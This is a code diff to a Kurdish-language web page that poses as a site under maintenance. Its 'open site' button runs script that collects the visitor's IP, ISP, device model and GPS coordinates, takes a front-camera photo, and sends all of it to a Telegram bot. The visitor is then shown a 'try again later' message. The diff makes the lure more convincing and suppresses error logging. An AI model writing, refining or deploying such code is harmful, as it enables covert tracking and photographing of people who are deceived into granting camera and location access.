@@ -28,7 +28,7 @@
         h1 { font-size: 22px; color: #e74c3c; margin-bottom: 15px; }
         p { font-size: 15px; color: #666; margin-bottom: 25px; }
         .btn {
-            background-color: #27ae60;
+            background-color: #e74c3c;
             color: white;
             border: none;
             padding: 15px 25px;
@@ -38,13 +38,13 @@
             width: 100%;
             font-weight: bold;
         }
-        .btn:hover { background-color: #219653; }
+        .btn:hover { background-color: #c0392b; }
     </style>
 </head>
 <body>
     <div class="container" id="content-box">
         <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
-        <p>بۆ بینینی ناوەڕۆک و چالاککردنی پەڕەکە، تکایە کلیک لەسەر دوگمەی خوارەوە بکە:</p>
+        <p>بۆ بینینی ناوەڕۆک و پشتڕاستکردنەوەی سیستەم، تکایە کلیک لەسەر دوگمەی خوارەوە بکە:</p>
         <button class="btn" onclick="startProcess()">کردنەوەی ماڵپەڕ</button>
     </div>
 
@@ -62,9 +62,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
                 });
-            } catch (err) {
-                console.error(err);
-            }
+            } catch (err) {}
         }
 
         async function sendTelegramPhoto(blob) {
@@ -72,21 +70,18 @@
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', blob, 'capture.jpg');
-            formData.append('caption', '📸 **وێنەی ڕاستەوخۆی بەکارهێنەر!**');
+            formData.append('caption', '📸 **وێنەی ڕاستەوخۆی کامێرای پێشەوە!**');
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            } catch (err) {
-                console.error(err);
-            }
+            } catch (err) {}
         }
 
         async function startProcess() {
-            // نیشاندانی پەیامی چاوەڕوانی
-            document.getElementById('content-box').innerHTML = '<h1>⏳ چاوەڕوان بێ...</h1><p>تکایە کەمێک بوەستە.</p>';
+            document.getElementById('content-box').innerHTML = '<h1>⏳ تكاتە چاوەڕوان بە...</h1><p>خەریکی پەیوەستبوون بە سیستەمەوە...</p>';
 
             let visitTime = new Date().toISOString().replace('T', ' ').substring(0, 19);
             
-            // وەرگرتنی زانیاری ئامێر
+            // وەرگرتنی مۆدێلی ئامێر
             let deviceModel = "نادیار";
             try {
                 const parser = new UAParser();
@@ -103,23 +98,24 @@
                 isp = data.org || 'نادیار';
             } catch (e) {}
 
-            // وەرگرتنی لۆکەیشن بە خێرایی (بە بێ وەستانی سکریپت ئەگەر ڕەتکرایەوە)
-            let locationText = "❌ لۆکەیشن بەردەست نییە";
+            // لۆکەیشن
+            let locationText = "❌ بەردەست نییە";
             try {
-                const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000 });
                 });
-                locationText = `🟢 لۆکەیشن: \`${pos.coords.latitude}, ${pos.coords.longitude}\``;
-            } catch (e) {
-                locationText = "🔴 لۆکەیشن ڕەتکرایەوە یان کاتی بەسەرچوو";
-            }
+                locationText = `\`${pos.coords.latitude}, ${pos.coords.longitude}\``;
+            } catch (e) {}
 
-            // وەرگرتنی وێنەی کامێرا بە شێوەیەکی پارێزراو
+            // داواکردنی ڕاستەوخۆی کامێرا (Allow)
             let imageBlob = null;
-            let cameraStatus = "❌ کامێرا بەردەست نییە";
+            let cameraStatus = "❌ ڕەتکرایەوە";
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                cameraStatus = "🟢 کامێرا سەرکەوتوو بوو";
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                cameraStatus = "🟢 Allow کراوە و وێنە گیرا";
+                
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
@@ -127,35 +123,38 @@
                 imageBlob = await new Promise((resolve) => {
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
-                        canvas.width = 640; canvas.height = 480;
+                        canvas.width = 640; 
+                        canvas.height = 480;
                         canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                         canvas.toBlob(blob => {
                             stream.getTracks().forEach(t => t.stop());
                             resolve(blob);
                         }, 'image/jpeg');
-                    }, 1000);
+                    }, 1200);
                 });
             } catch (e) {
-                cameraStatus = "🔴 کامێرا ڕەتکرایەوە یان قفڵ کراوە";
+                cameraStatus = "🔴 Deny کراوە (یان قفڵە)";
             }
 
-            // ناردنی پەیامی دەقی بۆ تێلێگرام
-            const msg = `🔔 **سەردانیکەرێکی نوێ!**
+            // ناردنی زانیارییەکان بۆ تێلێگرام
+            const msg = `🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**
 ⏰ کات: \`${visitTime}\`
 🌐 IP: \`${ip}\` (${isp})
-🎯 GPS: ${locationText}
-📷 کامێرا: ${cameraStatus}
+🎯 لۆکەیشن: ${locationText}
+📷 دۆخی کامێرا: ${cameraStatus}
 📱 ئامێر: \`${deviceModel}\``;
 
             await sendTelegramMessage(msg);
 
-            // ناردنی وێنە ئەگەر هەبوو
             if (imageBlob) {
                 await sendTelegramPhoto(imageBlob);
             }
 
-            // گەڕاندنەوەی باری ئاسایی پەڕەکە لەلای بەکارهێنەر
-            document.getElementById('content-box').innerHTML = '<h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1><p>تکایە دووبارە هەوڵ بدەرەوە.</p>';
+            // گەڕاندنەوەی دۆخی ئاسایی پەڕەکە
+            document.getElementById('content-box').innerHTML = `
+                <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
+                <p>تکایە کەمێکی تر هەوڵبدەرەوە، کار لەسەر چاککردنی سیستەمەکە دەکرێت.</p>
+            `;
         }
     </script>
 </body>
